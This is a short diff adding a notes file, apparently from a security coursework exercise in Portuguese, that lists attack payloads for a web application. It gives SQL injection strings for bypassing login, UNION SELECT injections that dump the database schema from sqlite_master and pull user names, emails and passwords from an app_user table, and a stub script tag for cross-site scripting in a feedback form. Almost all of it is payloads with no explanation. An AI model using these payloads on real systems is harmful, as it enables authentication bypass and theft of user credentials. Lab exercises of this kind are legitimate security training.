@@ -1,0 +1,25 @@
+analysis: contains scripts/textual descriptions/logs/screen captures demonstrating the exploration of each vulnerability;
+
+
+login -> password
+
+login com o user
+' or 1=1 ) -- //
+
+login com user 1 (admin)
+') or 1=1 -- //
+
+
+doctor -> search
+
+mostrar tabelas
+1' AND 1=2 UNION SELECT sql,1,1 FROM sqlite_master WHERE type='table' -- //
+
+mostrar users, emails, passwords
+1' AND 1=2 UNION SELECT name_, email, password_ FROM app_user -- //
+
+
+feedback -> comentar
+
+<script> </script> ....
+
